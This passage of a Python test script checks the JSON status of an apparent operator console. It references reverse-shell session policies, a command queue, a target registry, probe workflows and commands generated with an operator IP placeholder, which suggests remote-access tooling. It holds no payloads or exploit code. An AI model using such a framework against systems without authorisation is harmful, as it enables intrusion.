                api_resources_by_name.get("command_queue_commands", {}).get("has_warning_indexes") is not False or
                len(api_resources_by_warning_indexes.get("True", [])) < 4 or
                not any(rec.get("name") == "browser_paths" for rec in api_resources_by_warning_indexes.get("True", [])) or
                "services_by_name" not in (api_resources_by_name.get("services", {}).get("indexes") or []) or
                "services_by_session_log_exists" not in (api_resources_by_name.get("services", {}).get("indexes") or []) or
                "services_by_process_log_exists" not in (api_resources_by_name.get("services", {}).get("indexes") or []) or
                api_resources_by_name.get("command_queue_state_records", {}).get("records_key") != "command_queue_state_records" or
                api_resources_by_summary_key.get("command_queue_state_record_count", [{}])[0].get("name") != "command_queue_state_records" or
                not any(rec.get("name") == "command_queue_state_records" for rec in api_resources_by_primary_key.get("path", [])) or
                api_resources_by_name.get("service_manager_state_records", {}).get("records_key") != "service_manager_state_records" or
                api_resources_by_summary_key.get("service_manager_state_record_count", [{}])[0].get("name") != "service_manager_state_records" or
                not any(rec.get("name") == "service_manager_state_records" for rec in api_resources_by_primary_key.get("id", [])) or
                api_resources_by_name.get("command_queue_commands", {}).get("records_key") != "command_queue.commands" or
                api_resources_by_records_key.get("command_queue.commands", [{}])[0].get("name") != "command_queue_commands" or
                api_resources_by_name.get("command_queue_workflow_actions", {}).get("records_key") != "command_queue_workflow_actions" or
                api_resources_by_summary_key.get("command_queue_workflow_action_count", [{}])[0].get("name") != "command_queue_workflow_actions" or
                not any(rec.get("name") == "command_queue_workflow_actions" for rec in api_resources_by_primary_key.get("id", [])) or
                api_resources_by_name.get("release_artifact_workflow_actions", {}).get("records_key") != "release_artifact_workflow_actions" or
                api_resources_by_summary_key.get("release_artifact_workflow_action_count", [{}])[0].get("name") != "release_artifact_workflow_actions" or
                not any(rec.get("name") == "release_artifact_workflow_actions" for rec in api_resources_by_primary_key.get("id", [])) or
                api_resources_by_name.get("operator_console_workflows", {}).get("records_key") != "operator_console_workflows" or
                api_resources_by_summary_key.get("operator_console_workflow_count", [{}])[0].get("name") != "operator_console_workflows" or
                not any(rec.get("name") == "operator_console_workflows" for rec in api_resources_by_primary_key.get("id", [])) or
                api_resources_by_name.get("operator_daemon_workflow_actions", {}).get("records_key") != "operator_daemon_workflow_actions" or
                api_resources_by_summary_key.get("operator_daemon_workflow_action_count", [{}])[0].get("name") != "operator_daemon_workflow_actions" or
                not any(rec.get("name") == "operator_daemon_workflow_actions" for rec in api_resources_by_primary_key.get("id", [])) or
                api_resources_by_name.get("file_service_workflow_actions", {}).get("records_key") != "file_service_workflow_actions" or
                api_resources_by_summary_key.get("file_service_workflow_action_count", [{}])[0].get("name") != "file_service_workflow_actions" or
                not any(rec.get("name") == "file_service_workflow_actions" for rec in api_resources_by_primary_key.get("id", [])) or
                api_resources_by_name.get("command_queue_policy_records", {}).get("records_key") != "command_queue_policy_records" or
                api_resources_by_summary_key.get("command_queue_policy_record_count", [{}])[0].get("name") != "command_queue_policy_records" or
                not any(rec.get("name") == "command_queue_policy_records" for rec in api_resources_by_primary_key.get("id", [])) or
                api_resources_by_name.get("server_state_records", {}).get("records_key") != "server_state_records" or
                api_resources_by_summary_key.get("server_state_record_count", [{}])[0].get("name") != "server_state_records" or
                not any(rec.get("name") == "server_state_records" for rec in api_resources_by_primary_key.get("path", [])) or
                api_resources_by_name.get("operator_network_records", {}).get("records_key") != "operator_network_records" or
                api_resources_by_summary_key.get("operator_network_record_count", [{}])[0].get("name") != "operator_network_records" or
                not any(rec.get("name") == "operator_network_records" for rec in api_resources_by_primary_key.get("id", [])) or
                api_resources_by_name.get("operator_network_state_records", {}).get("records_key") != "operator_network_state_records" or
                api_resources_by_summary_key.get("operator_network_state_record_count", [{}])[0].get("name") != "operator_network_state_records" or
                not any(rec.get("name") == "operator_network_state_records" for rec in api_resources_by_primary_key.get("id", [])) or
                api_resources_by_name.get("target_registry_state_records", {}).get("records_key") != "target_registry_state_records" or
                api_resources_by_summary_key.get("target_registry_state_record_count", [{}])[0].get("name") != "target_registry_state_records" or
                not any(rec.get("name") == "target_registry_state_records" for rec in api_resources_by_primary_key.get("id", [])) or
                api_resources_by_name.get("target_filter_records", {}).get("records_key") != "target_filter_records" or
                api_resources_by_summary_key.get("target_filter_record_count", [{}])[0].get("name") != "target_filter_records" or
                not any(rec.get("name") == "target_filter_records" for rec in api_resources_by_primary_key.get("id", [])) or
                api_resources_by_name.get("target_attribution_records", {}).get("records_key") != "target_attribution_records" or
                api_resources_by_summary_key.get("target_attribution_record_count", [{}])[0].get("name") != "target_attribution_records" or
                not any(rec.get("name") == "target_attribution_records" for rec in api_resources_by_primary_key.get("scope", [])) or
                api_resources_by_name.get("target_command_state_records", {}).get("records_key") != "target_command_state_records" or
                api_resources_by_summary_key.get("target_command_state_record_count", [{}])[0].get("name") != "target_command_state_records" or
                not any(rec.get("name") == "target_command_state_records" for rec in api_resources_by_primary_key.get("id", [])) or
                api_resources_by_name.get("target_workflow_actions", {}).get("records_key") != "target_workflow_actions" or
                api_resources_by_summary_key.get("target_workflow_action_count", [{}])[0].get("name") != "target_workflow_actions" or
                not any(rec.get("name") == "target_workflow_actions" for rec in api_resources_by_primary_key.get("id", [])) or
                api_resources_by_name.get("service_workflow_actions", {}).get("records_key") != "service_workflow_actions" or
                api_resources_by_summary_key.get("service_workflow_action_count", [{}])[0].get("name") != "service_workflow_actions" or
                not any(rec.get("name") == "service_workflow_actions" for rec in api_resources_by_primary_key.get("id", [])) or
                api_resources_by_name.get("probe_workflow_actions", {}).get("records_key") != "probe_workflow_actions" or
                api_resources_by_summary_key.get("probe_workflow_action_count", [{}])[0].get("name") != "probe_workflow_actions" or
                not any(rec.get("name") == "probe_workflow_actions" for rec in api_resources_by_primary_key.get("id", [])) or
                api_resources_by_name.get("bridge_profile_workflow_actions", {}).get("records_key") != "bridge_profile_workflow_actions" or
                api_resources_by_summary_key.get("bridge_profile_workflow_action_count", [{}])[0].get("name") != "bridge_profile_workflow_actions" or
                not any(rec.get("name") == "bridge_profile_workflow_actions" for rec in api_resources_by_primary_key.get("id", [])) or
                api_resources_by_name.get("staged_file_workflow_actions", {}).get("records_key") != "staged_file_workflow_actions" or
                api_resources_by_summary_key.get("staged_file_workflow_action_count", [{}])[0].get("name") != "staged_file_workflow_actions" or
                not any(rec.get("name") == "staged_file_workflow_actions" for rec in api_resources_by_primary_key.get("id", [])) or
                api_resources_by_name.get("rshell_session_policy_records", {}).get("records_key") != "rshell_session_policy_records" or
                api_resources_by_summary_key.get("rshell_session_policy_record_count", [{}])[0].get("name") != "rshell_session_policy_records" or
                not any(rec.get("name") == "rshell_session_policy_records" for rec in api_resources_by_primary_key.get("id", [])) or
                api_resources_by_name.get("staged_files_state_records", {}).get("records_key") != "staged_files_state_records" or
                api_resources_by_summary_key.get("staged_files_state_record_count", [{}])[0].get("name") != "staged_files_state_records" or
                not any(rec.get("name") == "staged_files_state_records" for rec in api_resources_by_primary_key.get("path", [])) or
                api_resources_by_name.get("command_copy_state_records", {}).get("records_key") != "command_copy_state_records" or
                api_resources_by_summary_key.get("command_copy_state_record_count", [{}])[0].get("name") != "command_copy_state_records" or
                not any(rec.get("name") == "command_copy_state_records" for rec in api_resources_by_primary_key.get("id", [])) or
                api_resources_by_name.get("release_state_records", {}).get("records_key") != "release_state_records" or
                api_resources_by_summary_key.get("release_state_record_count", [{}])[0].get("name") != "release_state_records" or
                api_resources_by_primary_key.get("release_dir", [{}])[0].get("name") != "release_state_records" or
                api_resources_by_name.get("workbench_actions", {}).get("records_key") != "workbench_actions" or
                api_resources_by_summary_key.get("workbench_action_count", [{}])[0].get("name") != "workbench_actions" or
                api_resources_by_name.get("workbench_config_fields", {}).get("records_key") != "workbench_config_fields" or
                api_resources_by_summary_key.get("workbench_config_field_count", [{}])[0].get("name") != "workbench_config_fields" or
                api_resources_by_name.get("workbench_jobs_state_records", {}).get("records_key") != "workbench_jobs_state_records" or
                api_resources_by_summary_key.get("workbench_jobs_state_record_count", [{}])[0].get("name") != "workbench_jobs_state_records" or
                not any(rec.get("name") == "workbench_jobs_state_records" for rec in api_resources_by_primary_key.get("path", [])) or
                api_resources_by_name.get("workbench_jobs", {}).get("records_key") != "workbench_jobs" or
                api_resources_by_summary_key.get("workbench_job_count", [{}])[0].get("name") != "workbench_jobs" or
                api_resources_by_name.get("session_root_state_records", {}).get("records_key") != "session_root_state_records" or
                api_resources_by_summary_key.get("session_root_state_record_count", [{}])[0].get("name") != "session_root_state_records" or
                not any(rec.get("name") == "session_root_state_records" for rec in api_resources_by_primary_key.get("path", [])) or
                api_resources_by_summary_key.get("event_tail_count", [{}])[0].get("name") != "events" or
                api_resources_by_name.get("event_log_state_records", {}).get("records_key") != "event_log_state_records" or
                api_resources_by_summary_key.get("event_log_state_record_count", [{}])[0].get("name") != "event_log_state_records" or
                not any(rec.get("name") == "event_log_state_records" for rec in api_resources_by_primary_key.get("path", [])) or
                not any(rec.get("name") == "services" for rec in api_resources_by_primary_key.get("name", []))):
            print("server json status missing API resource catalog lookup maps", file=sys.stderr)
            print(queue_status_doc.stdout, file=sys.stderr)
            return 1
        if (operator_network_state.get("id") != "operator-network" or
                operator_network_state.get("selected_ip") != queue_status_json.get("selected_local_ip") or
                operator_network_state.get("record_count") != len(queue_status_json.get("operator_network_records") or []) or
                operator_network_state.get("detected_ip_count") != queue_status_json["summary"].get("operator_network_detected_ip_count") or
                operator_network_state.get("placeholder_count") != queue_status_json["summary"].get("operator_network_placeholder_count") or
                operator_network_state.get("selected_source") != queue_status_json["summary"].get("operator_network_selected_source") or
                operator_network_state.get("selected_placeholder") != queue_status_json["summary"].get("operator_network_selected_placeholder") or
                operator_network_state.get("uses_placeholder") != (operator_network_state.get("selected_ip") == "OPERATOR_IP") or
                operator_network_state.get("has_detected_ip") != (operator_network_state.get("detected_ip_count", 0) > 0) or
                operator_network_state.get("has_generated_command_ip") != bool(operator_network_state.get("selected_usable_for_generated_commands")) or
                queue_status_json["summary"].get("operator_network_state_record_count") != 1 or
                queue_status_json["summary"].get("operator_network_has_generated_command_ip") != bool(operator_network_state.get("has_generated_command_ip")) or
                queue_status_json.get("operator_network_state_records_by_selected_ip", {}).get(operator_network_state.get("selected_ip"), [{}])[0].get("id") != "operator-network" or
                "operator_network_state_records_by_has_generated_command_ip" not in ((queue_status_json.get("api_collections") or {}).get("operator_network_state_records") or {}).get("indexes", [])):
            print("server json status missing reusable operator network state record", file=sys.stderr)
            print(queue_status_doc.stdout, file=sys.stderr)
            return 1
        workbench_actions = queue_status_json.get("workbench_actions") or []
        target_workflow_actions = queue_status_json.get("target_workflow_actions") or []
        workbench_config_fields = queue_status_json.get("workbench_config_fields") or []
        config_fields_by_key = queue_status_json.get("workbench_config_fields_by_key") or {}
        config_fields_by_category = queue_status_json.get("workbench_config_fields_by_category") or {}
        config_fields_by_target_execution = queue_status_json.get("workbench_config_fields_by_target_execution") or {}
        config_fields_by_safety = queue_status_json.get("workbench_config_fields_by_safety_boundary") or {}
        config_fields_by_control_like = queue_status_json.get("workbench_config_fields_by_control_like") or {}
        actions_by_id = queue_status_json.get("workbench_actions_by_id") or {}
        actions_by_category = queue_status_json.get("workbench_actions_by_category") or {}
        actions_by_script = queue_status_json.get("workbench_actions_by_script") or {}
        actions_by_background = queue_status_json.get("workbench_actions_by_background_supported") or {}
        actions_by_confirmation = queue_status_json.get("workbench_actions_by_requires_confirmation") or {}
        actions_by_execution_default = queue_status_json.get("workbench_actions_by_execution_default") or {}
        actions_by_target_execution = queue_status_json.get("workbench_actions_by_target_execution") or {}
        actions_by_event = queue_status_json.get("workbench_actions_by_event") or {}
        actions_by_config_path = queue_status_json.get("workbench_actions_by_config_path") or {}
        actions_by_foreground = queue_status_json.get("workbench_actions_by_foreground_runnable") or {}
        actions_by_dry_run = queue_status_json.get("workbench_actions_by_dry_run_supported") or {}
        actions_by_placeholder = queue_status_json.get("workbench_actions_by_has_placeholder") or {}
        actions_by_run_command = queue_status_json.get("workbench_actions_by_has_run_command") or {}
        actions_by_start_job_command = queue_status_json.get("workbench_actions_by_has_start_job_command") or {}
        actions_by_operator_state = queue_status_json.get("workbench_actions_by_operator_action_state") or {}
        actions_by_operator_reason = queue_status_json.get("workbench_actions_by_operator_action_reason") or {}
        actions_by_enter = queue_status_json.get("workbench_actions_by_can_run_from_curses_enter") or {}
        actions_by_enter_action = queue_status_json.get("workbench_actions_by_curses_enter_action") or {}
        workbench_summary = queue_status_json.get("summary") or {}
        artifact_inspect_help = run("scripts/grit-artifact", "inspect", "--help")
        artifact_verify_help = run("scripts/grit-artifact", "verify", "--help")
        fetch_sources_help = run("scripts/lib/fetch-sources", "--help")
        verify_sources_help = run("scripts/lib/verify-sources", "--help")
        offline_unpack_help = run("scripts/lib/offline-unpack", "--help")
        offline_pack_help = run("scripts/lib/offline-pack", "--help")
        check_licensing_help = run("scripts/lib/check-licensing", "--help")
        install_dropin_help = run("scripts/tools/install-dropin-tool", "--help")
        if (artifact_inspect_help.returncode != 0 or
                "usage: grit-artifact inspect ARTIFACT" not in artifact_inspect_help.stdout or
                artifact_verify_help.returncode != 0 or
                "usage: grit-artifact verify ARTIFACT" not in artifact_verify_help.stdout or
                fetch_sources_help.returncode != 0 or
                "usage: scripts/lib/fetch-sources [MANIFEST]" not in fetch_sources_help.stdout or
                verify_sources_help.returncode != 0 or
                "usage: scripts/lib/verify-sources [MANIFEST]" not in verify_sources_help.stdout or
                offline_unpack_help.returncode != 0 or
                "usage: scripts/lib/offline-unpack grit-sdk-YYYYMMDD.tar.zst|tar.gz" not in offline_unpack_help.stdout or
                offline_pack_help.returncode != 0 or
                "usage: scripts/lib/offline-pack" not in offline_pack_help.stdout or
                check_licensing_help.returncode != 0 or
                "usage: scripts/lib/check-licensing [POLICY_JSON] [SOURCES_LOCK_JSON]" not in check_licensing_help.stdout or
                install_dropin_help.returncode != 0 or
                "usage: scripts/tools/install-dropin-tool --tool TOOL --source FILE" not in install_dropin_help.stdout):
            print("helper per-command help failed", file=sys.stderr)
            print(artifact_inspect_help.stdout + artifact_inspect_help.stderr, file=sys.stderr)
            print(artifact_verify_help.stdout + artifact_verify_help.stderr, file=sys.stderr)
            print(fetch_sources_help.stdout + fetch_sources_help.stderr, file=sys.stderr)
            print(verify_sources_help.stdout + verify_sources_help.stderr, file=sys.stderr)
            print(offline_unpack_help.stdout + offline_unpack_help.stderr, file=sys.stderr)
            print(offline_pack_help.stdout + offline_pack_help.stderr, file=sys.stderr)
            print(check_licensing_help.stdout + check_licensing_help.stderr, file=sys.stderr)
            print(install_dropin_help.stdout + install_dropin_help.stderr, file=sys.stderr)
            return 1
        if (target_workflow_actions != [] or
                workbench_summary.get("target_workflow_action_count") != 0 or
                workbench_summary.get("target_workflow_action_available_count") != 0 or
                "target_workflow_actions_by_workflow" not in ((queue_status_json.get("api_collections") or {}).get("target_workflow_actions") or {}).get("indexes", [])):
            print("server json status missing empty target workflow action collection", file=sys.stderr)
            print(queue_status_doc.stdout, file=sys.stderr)
            return 1
        if (len(workbench_config_fields) < 12 or
                workbench_summary.get("workbench_config_field_count") != len(workbench_config_fields) or
                workbench_summary.get("workbench_config_field_fixed_option_count", 0) < 10 or
                not config_fields_by_key.get("GRIT_TARGET_PRESET") or
                not config_fields_by_key.get("GRIT_STATIC_POLICY") or
                config_fields_by_key.get("GRIT_STATIC_POLICY", {}).get("options") != ["static-preferred", "static-only", "dynamic-ok"] or
                not config_fields_by_key.get("GRIT_COMMAND_QUEUE_ENABLE") or
                config_fields_by_key.get("GRIT_COMMAND_QUEUE_ENABLE", {}).get("fixed_options") is not True or
                config_fields_by_key.get("GRIT_COMMAND_QUEUE_ENABLE", {}).get("safety_boundary") != "command-queue" or
                not config_fields_by_key.get("GRIT_COMMAND_QUEUE_POLL_INTERVAL_SEC") or
                config_fields_by_key.get("GRIT_COMMAND_QUEUE_POLL_BACKOFF", {}).get("options") != ["none", "linear", "exponential"] or
                config_fields_by_key.get("GRIT_RSHELL_TRANSPORT", {}).get("safety_boundary") != "reverse-access" or
                not config_fields_by_category.get("runtime") or
                not config_fields_by_category.get("rshell") or
                config_fields_by_target_execution.get("True", []) != [] or
                len(config_fields_by_target_execution.get("False", [])) != len(workbench_config_fields) or
                not config_fields_by_safety.get("command-queue") or
                not config_fields_by_control_like.get("True") or
                workbench_summary.get("workbench_config_field_command_queue_related_count", 0) < 13):
            print("server json status missing guided build config descriptors", file=sys.stderr)
            print(queue_status_doc.stdout, file=sys.stderr)
            return 1
        if (len(workbench_actions) < 6 or
                workbench_summary.get("workbench_action_count") != len(workbench_actions) or
                workbench_summary.get("workbench_action_target_execution_count") != 0 or
                workbench_summary.get("workbench_action_background_supported_count", 0) < 2 or
                workbench_summary.get("workbench_action_requires_confirmation_count", 0) < 4 or
                workbench_summary.get("workbench_action_foreground_runnable_count", 0) < 8 or
                workbench_summary.get("workbench_action_dry_run_supported_count", 0) < 8 or
                workbench_summary.get("workbench_action_has_run_command_count", 0) < 8 or
                workbench_summary.get("workbench_action_has_start_job_command_count", 0) < 3 or
                workbench_summary.get("workbench_action_has_placeholder_count", 0) < 1 or
                workbench_summary.get("workbench_action_can_run_from_curses_enter_count", 0) < 3 or
                workbench_summary.get("workbench_action_execution_default_counts", {}).get("show-command") != len(workbench_actions) or
                workbench_summary.get("workbench_action_event_counts", {}).get("workbench_job_requested", 0) < 3 or
                workbench_summary.get("workbench_action_operator_action_state_counts", {}).get("background-ready", 0) < 3 or
                workbench_summary.get("workbench_action_operator_action_state_counts", {}).get("confirm-required", 0) < 4 or
                workbench_summary.get("workbench_action_operator_action_state_counts", {}).get("ready", 0) < 5 or
                workbench_summary.get("workbench_action_operator_action_state_counts", {}).get("needs-input", 0) < 1 or
                workbench_summary.get("workbench_action_operator_action_reason_counts", {}).get("start-background-job", 0) < 3 or
                workbench_summary.get("workbench_action_curses_enter_action_counts", {}).get("start-job", 0) < 3 or
                workbench_summary.get("workbench_action_config_path_counts", {}).get(str(cfg), 0) < 5 or
                actions_by_id.get("package-artifact", {}).get("command") != "make package" or
                actions_by_id.get("package-artifact", {}).get("start_job_command") != f"scripts/grit-console --config {str(cfg)} --start-workbench-job package-artifact" or
                actions_by_id.get("package-artifact", {}).get("operator_action_state") != "background-ready" or
                actions_by_id.get("package-artifact", {}).get("operator_action_reason") != "start-background-job" or
                actions_by_id.get("package-artifact", {}).get("can_run_from_curses_enter") is not True or
                actions_by_id.get("package-artifact", {}).get("curses_enter_action") != "start-job" or
                actions_by_id.get("release-current", {}).get("script") != "scripts/lib/release-current" or
                actions_by_id.get("release-current", {}).get("command") != "scripts/lib/release-current --config" or
                actions_by_id.get("release-current", {}).get("operator_action_state") != "background-ready" or
                actions_by_id.get("release-current", {}).get("can_run_from_curses_enter") is not True or
                actions_by_id.get("release-index", {}).get("script") != "scripts/lib/release-index" or
                actions_by_id.get("release-index", {}).get("command", "").startswith("scripts/lib/release-index --release-dir ") is not True or
                actions_by_id.get("release-index", {}).get("operator_action_state") != "ready" or
                actions_by_id.get("release-find", {}).get("script") != "scripts/lib/release-find" or
                actions_by_id.get("release-find", {}).get("command", "").startswith("scripts/lib/release-find --release-dir ") is not True or
                " FIND_ARGS" not in actions_by_id.get("release-find", {}).get("command", "") or
                actions_by_id.get("release-find", {}).get("operator_action_state") != "needs-input" or
                actions_by_id.get("tool-provider-check", {}).get("script") != "scripts/lib/check-tool-providers" or
                actions_by_id.get("tool-provider-check", {}).get("operator_action_state") != "needs-input" or
                actions_by_id.get("dropin-tool-status", {}).get("script") != "scripts/tools/dropin-tool-status" or
                actions_by_id.get("dropin-tool-status", {}).get("operator_action_state") != "needs-input" or
                actions_by_id.get("check-dropin-tool", {}).get("script") != "scripts/tools/check-dropin-tool" or
                actions_by_id.get("check-dropin-tool", {}).get("operator_action_state") != "needs-input" or
                actions_by_id.get("install-dropin-tool", {}).get("script") != "scripts/tools/install-dropin-tool" or
                actions_by_id.get("install-dropin-tool", {}).get("command") != "scripts/tools/install-dropin-tool --tool TOOL --source SOURCE" or
                actions_by_id.get("install-dropin-tool", {}).get("operator_action_state") != "needs-input" or
                actions_by_id.get("fetch-sources", {}).get("script") != "scripts/lib/fetch-sources" or
                actions_by_id.get("fetch-sources", {}).get("operator_action_state") != "background-ready" or
                actions_by_id.get("fetch-sources", {}).get("background_supported") is not True or
                actions_by_id.get("verify-sources", {}).get("script") != "scripts/lib/verify-sources" or
                actions_by_id.get("verify-sources", {}).get("operator_action_state") != "ready" or
                actions_by_id.get("check-licensing", {}).get("script") != "scripts/lib/check-licensing" or
                actions_by_id.get("check-licensing", {}).get("operator_action_state") != "ready" or
                actions_by_id.get("source-mirror-plan", {}).get("script") != "scripts/lib/mirror-sources" or
                actions_by_id.get("source-mirror-plan", {}).get("operator_action_state") != "needs-input" or
                "--dry-run" not in actions_by_id.get("source-mirror-plan", {}).get("command", "") or
                actions_by_id.get("offline-readiness", {}).get("script") != "scripts/lib/check-offline-readiness" or
                actions_by_id.get("offline-readiness", {}).get("operator_action_state") != "needs-input" or
                actions_by_id.get("offline-pack", {}).get("script") != "scripts/lib/offline-pack" or
                actions_by_id.get("offline-pack", {}).get("operator_action_state") != "confirm-required" or
                actions_by_id.get("offline-unpack", {}).get("script") != "scripts/lib/offline-unpack" or
                actions_by_id.get("offline-unpack", {}).get("command") != "scripts/lib/offline-unpack ARCHIVE" or
                actions_by_id.get("offline-unpack", {}).get("operator_action_state") != "needs-input" or
                actions_by_id.get("operator-daemon-start", {}).get("background_supported") is not True or
                actions_by_id.get("operator-daemon-start", {}).get("long_running") is not True or
                actions_by_id.get("operator-daemon-start", {}).get("operator_action_state") != "background-ready" or
                "--daemon --daemon-service file-service --daemon-service command-queue" not in actions_by_id.get("operator-daemon-start", {}).get("command", "") or
                actions_by_id.get("bringup-recommend", {}).get("script") != "scripts/grit-bringup" or
                actions_by_id.get("bringup-recommend", {}).get("operator_action_state") != "background-ready" or
                f"--operator-config {str(cfg)}" not in actions_by_id.get("bringup-recommend", {}).get("command", "") or
                "--operator-host " not in actions_by_id.get("bringup-recommend", {}).get("command", "") or
                actions_by_id.get("bringup-stage-recommended", {}).get("script") != "scripts/grit-bringup" or
                actions_by_id.get("bringup-stage-recommended", {}).get("operator_action_state") != "background-ready" or
                f"--operator-config {str(cfg)}" not in actions_by_id.get("bringup-stage-recommended", {}).get("command", "") or
                "--stage-recommended-artifact" not in actions_by_id.get("bringup-stage-recommended", {}).get("command", "") or
                actions_by_id.get("operator-daemon-stop", {}).get("command") != f"scripts/grit-console --config {str(cfg)} --stop" or
                actions_by_id.get("operator-daemon-stop", {}).get("run_command") != f"scripts/grit-console --config {str(cfg)} --run-workbench-action operator-daemon-stop" or
                actions_by_id.get("operator-daemon-stop", {}).get("dry_run_command") != f"scripts/grit-console --config {str(cfg)} --run-workbench-action operator-daemon-stop --workbench-action-dry-run" or
                actions_by_id.get("operator-daemon-stop", {}).get("operator_action_state") != "confirm-required" or
                actions_by_id.get("operator-daemon-stop", {}).get("can_run_from_curses_enter") is not False or
                actions_by_id.get("systemd-user-print", {}).get("command", "").endswith("--systemd-user-action print") is not True or
                actions_by_id.get("systemd-user-print", {}).get("operator_action_state") != "ready" or
                actions_by_id.get("systemd-user-install", {}).get("writes_config") is not True or
                actions_by_id.get("systemd-user-install", {}).get("operator_action_reason") != "confirmation-required" or
                actions_by_id.get("systemd-user-start", {}).get("requires_confirmation") is not True or
                actions_by_id.get("systemd-user-start", {}).get("command", "").endswith("--systemd-user-action start") is not True or
                actions_by_id.get("systemd-user-stop", {}).get("requires_confirmation") is not True or
                actions_by_id.get("systemd-user-stop", {}).get("command", "").endswith("--systemd-user-action stop") is not True or
                actions_by_id.get("systemd-user-restart", {}).get("requires_confirmation") is not True or
                actions_by_id.get("systemd-user-restart", {}).get("command", "").endswith("--systemd-user-action restart") is not True or
                actions_by_id.get("systemd-user-status", {}).get("requires_confirmation") is not False or
                actions_by_id.get("systemd-user-status", {}).get("command", "").endswith("--systemd-user-action status") is not True or
                actions_by_id.get("systemd-user-status", {}).get("operator_action_state") != "ready" or
                actions_by_id.get("inspect-artifact", {}).get("script") != "scripts/grit-artifact" or
                actions_by_id.get("inspect-artifact", {}).get("command") != "scripts/grit-artifact inspect ARTIFACT" or
                actions_by_id.get("inspect-artifact", {}).get("operator_action_state") != "needs-input" or
                actions_by_id.get("verify-artifact", {}).get("script") != "scripts/grit-artifact" or
                actions_by_id.get("verify-artifact", {}).get("command") != "scripts/grit-artifact verify ARTIFACT" or
                actions_by_id.get("verify-artifact", {}).get("operator_action_state") != "needs-input" or
                actions_by_id.get("configure-trailer", {}).get("script") != "scripts/grit-artifact" or
                actions_by_id.get("configure-trailer", {}).get("command") != "scripts/grit-artifact config set ARTIFACT KEY=VALUE" or
                actions_by_id.get("configure-trailer", {}).get("operator_action_state") != "needs-input" or
                not actions_by_category.get("configuration") or
                len(actions_by_category.get("daemon", [])) < 9 or
                len(actions_by_category.get("tooling", [])) < 4 or
                len(actions_by_category.get("offline", [])) < 7 or
                not actions_by_script.get("scripts/grit-bringup") or
                len(actions_by_script.get("scripts/grit-artifact", [])) < 3 or
                len(actions_by_script.get("scripts/tools/dropin-tool-status", [])) < 1 or
                len(actions_by_script.get("scripts/tools/install-dropin-tool", [])) < 1 or
                len(actions_by_script.get("scripts/lib/fetch-sources", [])) < 1 or
                len(actions_by_script.get("scripts/lib/check-licensing", [])) < 1 or
                len(actions_by_script.get("scripts/lib/offline-unpack", [])) < 1 or
                len(actions_by_script.get("scripts/lib/mirror-sources", [])) < 1 or
                not actions_by_script.get("scripts/grit-console") or
                not actions_by_background.get("True") or
                not actions_by_confirmation.get("True") or
                not actions_by_foreground.get("True") or
                not actions_by_dry_run.get("True") or
                not actions_by_placeholder.get("True") or
                not actions_by_run_command.get("True") or
                not actions_by_start_job_command.get("True") or
                not actions_by_operator_state.get("background-ready") or
                not actions_by_operator_state.get("confirm-required") or
                not actions_by_operator_state.get("ready") or
                not actions_by_operator_state.get("needs-input") or
                not actions_by_operator_reason.get("start-background-job") or
                not actions_by_operator_reason.get("confirmation-required") or
                not actions_by_enter.get("True") or
                not actions_by_enter_action.get("start-job") or
                actions_by_execution_default.get("show-command", [{}])[0].get("execution_default") != "show-command" or
                actions_by_target_execution.get("True", []) != [] or
                len(actions_by_target_execution.get("False", [])) != len(workbench_actions) or
                not actions_by_event.get("workbench_job_requested") or
                not any(item.get("id") == "package-artifact" for item in actions_by_config_path.get(str(cfg), [])) or
                "workbench_actions_by_requires_confirmation" not in ((queue_status_json.get("api_collections") or {}).get("workbench_actions") or {}).get("indexes", []) or
                "workbench_actions_by_execution_default" not in ((queue_status_json.get("api_collections") or {}).get("workbench_actions") or {}).get("indexes", []) or
                "workbench_actions_by_target_execution" not in ((queue_status_json.get("api_collections") or {}).get("workbench_actions") or {}).get("indexes", []) or
                "workbench_actions_by_event" not in ((queue_status_json.get("api_collections") or {}).get("workbench_actions") or {}).get("indexes", []) or
                "workbench_actions_by_config_path" not in ((queue_status_json.get("api_collections") or {}).get("workbench_actions") or {}).get("indexes", []) or
                "workbench_actions_by_foreground_runnable" not in ((queue_status_json.get("api_collections") or {}).get("workbench_actions") or {}).get("indexes", []) or
                "workbench_actions_by_has_start_job_command" not in ((queue_status_json.get("api_collections") or {}).get("workbench_actions") or {}).get("indexes", []) or
                "workbench_actions_by_operator_action_state" not in ((queue_status_json.get("api_collections") or {}).get("workbench_actions") or {}).get("indexes", []) or
                "workbench_actions_by_can_run_from_curses_enter" not in ((queue_status_json.get("api_collections") or {}).get("workbench_actions") or {}).get("indexes", [])):
            print("server json status missing operator workflow action descriptors", file=sys.stderr)
            print(queue_status_doc.stdout, file=sys.stderr)
            return 1
        workbench_jobs = queue_status_json.get("workbench_jobs") or []
        workbench_jobs_state = queue_status_json.get("workbench_jobs_state") or {}
        jobs_by_id = queue_status_json.get("workbench_jobs_by_id") or {}
        jobs_by_action = queue_status_json.get("workbench_jobs_by_action") or {}
        jobs_by_state = queue_status_json.get("workbench_jobs_by_effective_state") or {}
        jobs_by_pid_managed = queue_status_json.get("workbench_jobs_by_pid_managed") or {}
        jobs_by_log_exists = queue_status_json.get("workbench_jobs_by_log_exists") or {}
        jobs_by_exit_status_known = queue_status_json.get("workbench_jobs_by_exit_status_known") or {}
        jobs_by_started_at_known = queue_status_json.get("workbench_jobs_by_started_at_known") or {}
        jobs_by_finished_at_known = queue_status_json.get("workbench_jobs_by_finished_at_known") or {}
        jobs_by_duration_known = queue_status_json.get("workbench_jobs_by_duration_known") or {}
        jobs_by_elapsed_known = queue_status_json.get("workbench_jobs_by_elapsed_known") or {}
        jobs_by_background_supported = queue_status_json.get("workbench_jobs_by_background_supported") or {}
        jobs_by_long_running = queue_status_json.get("workbench_jobs_by_long_running") or {}
        jobs_api = (queue_status_json.get("api_collections") or {}).get("workbench_jobs") or {}
        job = jobs_by_id.get("job-smoke") or {}
        if (len(workbench_jobs) != 1 or
                queue_status_json.get("summary", {}).get("workbench_job_count") != 1 or
                queue_status_json.get("summary", {}).get("workbench_job_running_count") != 0 or
                queue_status_json.get("summary", {}).get("workbench_job_pid_managed_count") != 0 or
                queue_status_json.get("summary", {}).get("workbench_job_log_exists_count") != 1 or
                queue_status_json.get("summary", {}).get("workbench_job_log_total_size") != workbench_job_log.stat().st_size or
                queue_status_json.get("summary", {}).get("workbench_job_last_output_tail_truncated_count") != 1 or
                queue_status_json.get("summary", {}).get("workbench_job_started_at_known_count") != 1 or
                queue_status_json.get("summary", {}).get("workbench_job_finished_at_known_count") != 0 or
                queue_status_json.get("summary", {}).get("workbench_job_duration_known_count") != 0 or
                queue_status_json.get("summary", {}).get("workbench_job_elapsed_known_count") != 1 or
